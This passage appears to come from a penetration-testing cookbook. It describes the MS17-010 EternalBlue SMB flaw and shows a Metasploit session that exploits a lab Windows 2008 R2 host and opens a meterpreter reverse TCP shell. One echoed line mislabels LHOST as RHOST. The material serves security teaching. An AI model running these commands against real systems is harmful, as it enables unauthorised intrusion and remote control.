# Getting ready

Without going into too much detail, the MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption exploit module is a part of the Equation Group ETERNALBLUE exploit, part of the FuzzBunch toolkit released by Shadow Brokers, generally believed to be developed by the U.S. National Security Agency (NSA) and used as part of the WannaCry ransomware attack. It is a buffer overflow in the memmove operation in Srv!SrvOs2FeaToNt that allows us to execute an arbitrary payload. This vulnerability affects Windows machines without security update MS17-010 for Microsoft Windows SMB Server SMBv1 Server.

# How to do it...

To launch the exploit, use the MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption exploit module, set the target IP address, use a meterpreter reverse TCP payload, and specify the listening address:

```
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) > set RHOST 192.168.216.10
RHOST => 192.168.216.10
msf exploit(ms17_010_eternalblue) > set PAYLOAD
windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(ms17_010_eternalblue) > set LHOST 192.168.216.5
RHOST => 192.168.216.5
msf exploit(ms17_010_eternalblue) > exploit
...

meterpreter > sysinfo
Computer : VAGRANT-2008R2
OS : Windows 2008 R2 (Build 7601, Service Pack 1).
...

meterpreter >
```

One outcome of a penetration test that differentiates it from a vulnerability scanner, is that no one will state that what you've found is a false positive when you present them with a screenshot of a shell running on the target system.